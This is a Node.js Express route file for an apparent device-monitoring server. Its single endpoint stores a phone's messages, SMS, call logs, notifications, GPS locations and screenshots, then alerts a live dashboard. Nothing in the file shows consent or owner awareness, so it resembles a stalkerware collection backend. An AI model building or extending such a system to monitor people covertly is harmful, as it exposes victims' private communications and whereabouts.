const express = require('express');
const router = express.Router();
const Message = require('../models/Message');
const Location = require('../models/Location');
const CallLog = require('../models/CallLog');
const Notification = require('../models/Notification');
const Sms = require('../models/Sms');
const Screenshot = require('../models/Screenshot');
const { authenticate } = require('../middleware/auth');

// Expose a setter so server.js can inject the WebSocket broadcast function
let broadcastUpdate = null;
router.setBroadcast = (fn) => { broadcastUpdate = fn; };

router.post('/sync', authenticate, async (req, res, next) => {
  try {
    const {
      deviceId,
      messages = [],
      locations = [],
      notifications = [],
      sms = [],
      callLogs = [],
      screenshots = [],
    } = req.body;

    if (!deviceId || typeof deviceId !== 'string' || !deviceId.trim()) {
      return res.status(400).json({ error: 'Missing or invalid deviceId.' });
    }

    if (!Array.isArray(messages) || !Array.isArray(locations)) {
      return res.status(400).json({ error: 'Messages and locations must be arrays.' });
    }

    let syncedMessagesCount = 0;
    let syncedLocationsCount = 0;
    let syncedNotificationsCount = 0;
    let syncedSmsCount = 0;
    let syncedCallLogsCount = 0;
    let syncedScreenshotsCount = 0;

    // Process messages in bulk upsert
    if (messages.length > 0) {
      const messageOperations = messages
        .filter((msg) => msg && msg.clientId && typeof msg.body === 'string')
        .map((msg) => ({
          updateOne: {
            filter: { deviceId, clientId: msg.clientId },
            update: {
              $set: {
                deviceId,
                clientId: msg.clientId,
                body: msg.body,
                createdAt: msg.createdAt ? new Date(msg.createdAt) : new Date(),
              },
            },
            upsert: true,
          },
        }));

      if (messageOperations.length > 0) {
        const result = await Message.bulkWrite(messageOperations);
        syncedMessagesCount = (result.upsertedCount || 0) + (result.modifiedCount || 0);
      }
    }

    // Process locations in bulk upsert
    if (locations.length > 0) {
      const locationOperations = locations
        .filter((loc) => loc && loc.clientId && typeof loc.latitude === 'number' && typeof loc.longitude === 'number')
        .map((loc) => ({
          updateOne: {
            filter: { deviceId, clientId: loc.clientId },
            update: {
              $set: {
                deviceId,
                clientId: loc.clientId,
                latitude: loc.latitude,
                longitude: loc.longitude,
                accuracy: typeof loc.accuracy === 'number' ? loc.accuracy : 0,
                capturedAt: loc.capturedAt ? new Date(loc.capturedAt) : new Date(),
              },
            },
            upsert: true,
          },
        }));

      if (locationOperations.length > 0) {
        const result = await Location.bulkWrite(locationOperations);
        syncedLocationsCount = (result.upsertedCount || 0) + (result.modifiedCount || 0);
      }
    }

    // Process notifications in bulk upsert
    if (Array.isArray(notifications) && notifications.length > 0) {
      const notificationOps = notifications
        .filter(n => n && typeof n.timestamp === 'string')
        .map(n => ({
          updateOne: {
            filter: { deviceId, clientId: n.clientId, appId: n.appId, timestamp: new Date(n.timestamp) },
            update: { $set: { deviceId, clientId: n.clientId, appId: n.appId, title: n.title, body: n.body, timestamp: new Date(n.timestamp), raw: n.raw } },
            upsert: true,
          },
        }));
      if (notificationOps.length > 0) {
        const result = await Notification.bulkWrite(notificationOps);
        syncedNotificationsCount = (result.upsertedCount || 0) + (result.modifiedCount || 0);
      }
    }

    // Process SMS messages in bulk upsert
    if (Array.isArray(sms) && sms.length > 0) {
      const smsOps = sms
        .filter(s => s && typeof s.timestamp === 'string')
        .map(s => ({
          updateOne: {
            filter: { deviceId, clientId: s.clientId, address: s.address, timestamp: new Date(s.timestamp) },
            update: { $set: { deviceId, clientId: s.clientId, address: s.address, body: s.body, type: s.type, timestamp: new Date(s.timestamp) } },
            upsert: true,
          },
        }));
      if (smsOps.length > 0) {
        const result = await Sms.bulkWrite(smsOps);
        syncedSmsCount = (result.upsertedCount || 0) + (result.modifiedCount || 0);
      }
    }

    // Process Call Logs in bulk upsert
    if (Array.isArray(callLogs) && callLogs.length > 0) {
      const callLogOps = callLogs
        .filter(c => c && typeof c.timestamp === 'string')
        .map(c => ({
          updateOne: {
            filter: { deviceId, clientId: c.clientId, number: c.number, timestamp: new Date(c.timestamp) },
            update: { $set: { deviceId, clientId: c.clientId, number: c.number, type: c.type, duration: c.duration, timestamp: new Date(c.timestamp) } },
            upsert: true,
          },
        }));
      if (callLogOps.length > 0) {
        const result = await CallLog.bulkWrite(callLogOps);
        syncedCallLogsCount = (result.upsertedCount || 0) + (result.modifiedCount || 0);
      }
    }

    // Process Screenshots in bulk upsert
    if (Array.isArray(screenshots) && screenshots.length > 0) {
      const screenshotOps = screenshots
        .filter(s => s && s.clientId)
        .map(s => ({
          updateOne: {
            filter: { deviceId, clientId: s.clientId },
            update: {
              $set: {
                deviceId,
                clientId: s.clientId,
                capturedAt: s.capturedAt ? new Date(s.capturedAt) : new Date(),
                imageBase64: s.imageBase64,
                thumbnailBase64: s.thumbnailBase64,
                width: s.width,
                height: s.height,
              },
            },
            upsert: true,
          },
        }));
      if (screenshotOps.length > 0) {
        const result = await Screenshot.bulkWrite(screenshotOps);
        syncedScreenshotsCount = (result.upsertedCount || 0) + (result.modifiedCount || 0);
      }
    }

    // Broadcast WebSocket update to connected dashboard clients
    if (broadcastUpdate) {
      broadcastUpdate({
        event: 'data_updated',
        deviceId,
        timestamp: new Date().toISOString(),
        counts: {
          messages: syncedMessagesCount,
          locations: syncedLocationsCount,
          notifications: syncedNotificationsCount,
          sms: syncedSmsCount,
          callLogs: syncedCallLogsCount,
        },
      });
    }

    return res.status(200).json({
      success: true,
      deviceId,
      syncedMessages: syncedMessagesCount,
      syncedLocations: syncedLocationsCount,
      syncedNotifications: syncedNotificationsCount,
      syncedSms: syncedSmsCount,
      syncedCallLogs: syncedCallLogsCount,
      syncedScreenshots: syncedScreenshotsCount,
      receivedMessages: messages.length,
      receivedLocations: locations.length,
    });
  } catch (error) {
    next(error);
  }
});

module.exports = router;
